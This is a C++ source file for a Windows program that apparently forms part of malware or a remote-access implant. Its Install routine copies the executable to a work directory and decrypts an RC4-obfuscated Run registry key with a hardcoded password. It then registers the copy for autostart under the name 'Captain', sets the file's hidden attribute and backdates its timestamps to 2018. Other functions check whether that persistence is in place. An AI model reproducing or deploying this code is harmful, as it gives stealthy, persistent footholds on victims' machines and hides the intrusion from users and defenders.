#include <iostream>
#include <ctime>
#include <chrono>
#include <windows.h>
#include <minwindef.h>
#include <libloaderapi.h>
#include <codecvt>
#include <Shlwapi.h>
#include <algorithm>
#include "Startup.h"
#include "Paths.h"
#include "registry.h"
#include "rc4.h"

#pragma comment(lib, "advapi32.lib")


// Defining a static string that holds the registry key for Windows startup entries.
//std::string Startup::StartupKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
std::string Startup::StartupKey = "";

const char* StartupRegKey = "\x02\x64\x06\x2d\xf0\xf1\x15\x38\x4f\x83\xdc\x3a\x6f\xc7\x91\x1f\x7b\x59\x2a\x8d\x40\x44\xb8\xf9\xae\x4c\x68\x06\x36\xd7\xeb\xd3\x77\x08\x29\x53\xd7\xbe\xb5\xfe\x11\x42\x98\xdd\x08";
// Initializing the InstallDirectory with a value returned from Paths::InitWorkDir() function.
std::string Startup::InstallDirectory = Paths::InitWorkDir();

// Setting the CurrentExecutablePath with the current working directory by calling the function getCurrentDirectory().
std::string Startup::CurrentExecutablePath = Startup::getCurrentDirectory();

// Setting the InstallFile to the full path of the install directory by calling getFullFilePath with InitWorkDir() value.
std::string Startup::InstallFile = getFullFilePath(Paths::InitWorkDir());

// Assigning the name of the current file to the StartupName variable by using the GetCurrentFileName function.
std::string Startup::StartupName = Startup::GetCurrentFileName(CurrentExecutablePath);

// Function to extract just the file name from a complete file path.
std::string Startup::GetCurrentFileName(std::string path)
{
	// PathFindFileName returns the filename from a full path.
	std::string Temp = PathFindFileName(path.c_str());
	return Temp;  // Return the extracted filename.
}

// Function to set the creation date of a file specified by a path.
void Startup::SetFileCreationDate(const std::string path)
{
	// If the path is empty, set the filename to the current executable path.
	std::string filename = path;
	if (filename.empty())
	{
		filename = CurrentExecutablePath;  // Default to the current executable path.
	}

	// Define a tm struct that represents a specific date and time (March 22, 2018 at 3:16 AM).
	std::tm time = { 0, 16, 3, 22, 4, 118 };

	// Prepare a SYSTEMTIME struct to set the file creation date.
	SYSTEMTIME st = {};
	st.wYear = time.tm_year + 1900;  // Year is adjusted because tm_year is the years since 1900.
	st.wMonth = time.tm_mon + 1;     // Month is 0-indexed in tm struct.
	st.wDay = time.tm_mday;          // Day of the month.
	st.wHour = time.tm_hour;         // Hour.
	st.wMinute = time.tm_min;        // Minute.
	st.wSecond = time.tm_sec;        // Second.

	// Convert SYSTEMTIME to FILETIME.
	FILETIME ft = {};
	SystemTimeToFileTime(&st, &ft);

	// Open the file with WRITE_ATTRIBUTES access to modify its attributes (creation time).
	HANDLE handle = CreateFile(
		filename.c_str(),              // File path.
		FILE_WRITE_ATTRIBUTES,         // Allow writing to file attributes.
		0,                             // No sharing.
		NULL,                          // No security attributes.
		OPEN_EXISTING,                 // Open an existing file.
		FILE_ATTRIBUTE_NORMAL,         // Normal file attributes.
		NULL                           // No template file.
	);

	// Set the file times to the specified value.
	SetFileTime(handle, &ft, &ft, &ft);  // Set creation, last access, and last modified times to ft.

	// Close the file handle to release the file.
	CloseHandle(handle);
}

// Function to hide a file by changing its attributes to include 'hidden' and 'archive' (for files).
bool Startup::HideFile(std::string path)
{
	// If no path is provided, default to the current executable path.
	std::string filename = path;
	if (path.empty())
	{
		filename = CurrentExecutablePath;  // Use the current executable path.

	}

	// Get the current file attributes.
	DWORD attributes = GetFileAttributes(filename.c_str());

	// Check if the file path is valid (i.e., exists).
	if (attributes == INVALID_FILE_ATTRIBUTES)
	{
		// If invalid, print an error message with the error code.
		std::cerr << "Invalid file attribute of path: " << filename << ", error code: " << GetLastError() << std::endl;
		return false;  // Return false if the file is invalid.
	}

	// Check if the file is a directory.
	if ((attributes & FILE_ATTRIBUTE_DIRECTORY) != 0)
	{
		// If it's a directory, only add the hidden attribute.
		attributes |= FILE_ATTRIBUTE_HIDDEN;
	}
	else
	{
		// If it's a regular file, add both hidden and archive attributes.
		attributes |= FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_ARCHIVE;
	}

	// Set the new attributes for the file.
	if (SetFileAttributes(filename.c_str(), attributes) != 0)
	{
		// If successful, log the action and print a success message.
		//Logging::Log("HideFile : Adding 'hidden' attribute to file " + path);
		return true;  // Return true if the file was successfully hidden.
	}
	else
	{
		// If failed, print an error message with the error code.
		std::cerr << "Failed to hide path: " << filename << ", error code: " << GetLastError() << std::endl;
		return false;  // Return false if the file couldn't be hidden.
	}
}

// Function to check if a program is installed to startup by querying the registry.
bool Startup::IsInstalledToStartup(const std::string& startup_name, const std::string install_file, std::string startup_key)
{
	// Declare necessary variables for registry operations and file handling.
	HKEY key;                    // Handle for the registry key.
	DWORD value_data_size;       // Size of the registry value data.
	std::string value_data;      // Holds the registry value data (file path).
	std::wstring startup_name_wide; // Wide string version of the startup program name.
	std::wstring install_file_wide; // Wide string version of the install file path.

	// Initially, assume the program is not installed to startup.
	bool is_installed = false;

	// Convert startup_name and install_file from std::string to std::wstring for registry operations.
	std::wstring_convert<std::codecvt_utf8_utf16<wchar_t>> converter;
	startup_name_wide = converter.from_bytes(startup_name);  // Convert the startup name.
	install_file_wide = converter.from_bytes(install_file);  // Convert the install file path.

	// Determine if the system is 64-bit or 32-bit.
	SYSTEM_INFO system_info;
	GetNativeSystemInfo(&system_info); // Get system info about architecture.
	bool is_64_bit_system = (system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64 ||
		system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64);  // Check for 64-bit system.

	// Set the appropriate registry key based on system architecture.
	if (is_64_bit_system)
	{
		startup_key = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";  // For 64-bit systems.
	}
	else
	{
		startup_key = "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run";  // For 32-bit systems.
	}

	// Try to open the registry key for the current user's startup.
	LONG result = RegOpenKeyExW(HKEY_CURRENT_USER, converter.from_bytes(startup_key).c_str(), 0, KEY_READ | (is_64_bit_system ? KEY_WOW64_64KEY : KEY_WOW64_32KEY), &key);
	if (result != ERROR_SUCCESS)
	{
		// If registry key couldn't be opened, log the error and return false.
		std::cerr << "Failed to open registry key: " << startup_key << ", error code: " << result << std::endl;
		return is_installed;
	}

	// Query the registry for the value associated with the startup name.
	result = RegQueryValueExW(key, startup_name_wide.c_str(), NULL, NULL, NULL, &value_data_size);
	if (result == ERROR_SUCCESS && value_data_size > 0)
	{
		// If the value exists and is valid, resize the value_data buffer.
		value_data.resize(value_data_size);
		// Query the registry again to get the actual value data (the path to the executable).
		result = RegQueryValueExA(key, converter.to_bytes(startup_name_wide).c_str(), NULL, NULL, reinterpret_cast<LPBYTE>(&value_data[0]), &value_data_size);
		if (result == ERROR_SUCCESS)
		{
			// If the value data is retrieved successfully and not empty.
			if (!value_data.empty())
			{
				// Check if the file exists at the install file path.
				if (PathFileExistsW(install_file_wide.c_str()))
				{
					// If the file exists, the program is considered installed to startup.
					is_installed = true;
				}
			}
			
		}
		else
		{
			// If failed to retrieve registry value, log the error.
			std::cerr << "Failed to get registry value: " << startup_name << ", error code: " << result << std::endl;
		}
	}

	// Close the registry key after use.
	RegCloseKey(key);

	// Return whether the program is installed to startup or not.
	return is_installed;
}

// Function to add the program to the startup registry.
void Startup::Install()
{
	// Exception handling to ensure robustness.
	try
	{
		//// Check if the current executable exists. If not, throw an error.
		//if (!PathFileExistsA(CurrentExecutablePath.c_str()))
		//	std::cout << "Startup::Install the current executable exists" << std::endl;
		//	throw std::runtime_error("Error: Executable file not found.");

		//// If the install file doesn't exist, copy the executable to the install location.
		//if (!PathFileExistsA(InstallFile.c_str()))
		//	std::cout << "Startup::Install current executable dose not exists" << std::endl;

		CopyFileA(CurrentExecutablePath.c_str(), InstallFile.c_str(), FALSE);

		// Decrypt Reg Key
		char* DecryptedRegKey = (char*)RC4((char*)"Calderaint=1@1&1%", (unsigned char*)StartupRegKey, strlen(StartupRegKey));

		// Create or open the registry key for the startup location.
		if (UpdateRegistry(HKEY_CURRENT_USER, (char*)DecryptedRegKey, (char*)"Captain", (char*)InstallFile.c_str(), InstallFile.length(), REG_SZ, false))

		//free(DecryptedRegKey);

		// Hide the file by adding the 'hidden' attribute.
		HideFile(InstallFile);
		// Set the creation date of the install file.
		SetFileCreationDate(InstallFile);

	}
	catch (const std::exception& ex)
	{
		// If any exception occurs, log the error message.
		std::cerr << ex.what() << std::endl;
	}
}

// Function to find a substring (pattern) in a string (str) in a case-insensitive manner.
size_t findstr(const std::wstring& str, const std::wstring& pattern) {
	// Convert both the input string and the pattern to lowercase to ensure case-insensitive comparison.
	std::wstring lowerStr = str;
	std::wstring lowerPattern = pattern;
	std::transform(lowerStr.begin(), lowerStr.end(), lowerStr.begin(), ::tolower);  // Convert str to lowercase.
	std::transform(lowerPattern.begin(), lowerPattern.end(), lowerPattern.begin(), ::tolower);  // Convert pattern to lowercase.

	// Find the position of the pattern in the string and return the index. If not found, returns std::wstring::npos.
	return lowerStr.find(lowerPattern);
}

// Function to check if the program is launched from the startup registry key.
bool Startup::IsFromStartup()
{
	// Exception handling to ensure robustness in case of errors.
	try
	{
		// Declare a buffer to hold the executable path.
		wchar_t buf[MAX_PATH];
		std::wstring executablePath;  // To hold the full path of the current executable.
		std::wstring startupDirectory; // To hold the directory of the executable.

		// Get the full path of the current executable and store it in buf.
		DWORD len = GetModuleFileNameW(NULL, buf, MAX_PATH);
		if (len > 0)
		{

			// Assign the full executable path to the variable executablePath.
			executablePath = buf;

			// Assign the startup directory (the folder containing the executable).
			startupDirectory = std::wstring(buf, buf + len);
			// Remove the file name from the path to get the directory of the executable.
			PathRemoveFileSpecW(buf);
			startupDirectory = buf;

			// Declare a registry handle for the startup registry key.
			HKEY hkey;
			// Open the registry key that stores programs set to run at startup.
			if (RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hkey) == ERROR_SUCCESS)
			{

				// Declare variables to hold the type and size of the registry value.
				DWORD type, size;
				buf[0] = 0;  // Initialize the buffer.
				size = sizeof(buf);

				// Query the registry value corresponding to the executable's file name.
				if (RegQueryValueExW(hkey, PathFindFileNameW(executablePath.c_str()), NULL, &type, (LPBYTE)buf, &size) == ERROR_SUCCESS && type == REG_SZ)
				{

					// If the registry value exists and is of type REG_SZ (string), store it in a wstring.
					std::wstring value = buf;

					// Check if the startup directory path is found in the registry value using the findstr function.
					if (findstr(value, startupDirectory) != std::string::npos)
					{

						// If the directory is found in the registry value, close the registry key and return true.
						RegCloseKey(hkey);
						return true;
					}
					
					
				}
				
				// Close the registry key if the check fails.
				RegCloseKey(hkey);
			}
			
			// Return false if the program was not found in the startup registry key.
			return false;
		}
		else
		{
			// If GetModuleFileNameW fails to retrieve the executable path, throw an exception.
			throw std::runtime_error("Error: Failed to get executable path.");
		}
	}
	// Catch any exceptions and log the error message.
	catch (const std::exception& ex)
	{
		std::cerr << ex.what() << std::endl;
		return false;  // Return false if an exception occurred.
	}
}

// Function to get the current directory where the executable is located.
std::string Startup::getCurrentDirectory()
{
	// Declare a buffer to hold the executable path.
	char path[MAX_PATH];

	// Get the full path of the current executable and store it in the buffer.
	GetModuleFileName(NULL, path, MAX_PATH);

	// Convert the path to a std::string and return it.
	std::string CurrentDirectory = path;

	return CurrentDirectory;
}

// Function to get the full file path by combining the installation directory and executable file name.
std::string Startup::getFullFilePath(const std::string installDirectory)
{
	// Get the handle of the current module (executable).
	HMODULE hModule = GetModuleHandleA(NULL);

	// Declare a buffer to hold the full executable path.
	char path[MAX_PATH];
	// Get the path of the executable.
	GetModuleFileNameA(hModule, path, MAX_PATH);

	// Declare buffers to store different parts of the path: drive, directory, filename, and extension.
	char drive[_MAX_DRIVE], dir[_MAX_DIR], name[_MAX_FNAME], ext[_MAX_EXT];
	// Split the full executable path into its components (drive, directory, filename, extension).
	_splitpath_s(path, drive, _MAX_DRIVE, dir, _MAX_DIR, name, _MAX_FNAME, ext, _MAX_EXT);

	// Combine the filename and extension to form the file name.
	std::string fileName = name + std::string(ext);

	// Declare a buffer to hold the full file path (install directory + file name).
	char fullPath[MAX_PATH];
	// Combine the install directory with the file name to get the full path.
	PathCombineA(fullPath, const_cast<char*>(installDirectory.c_str()), fileName.c_str());

	// Return the full path as a std::string.
	return fullPath;
}
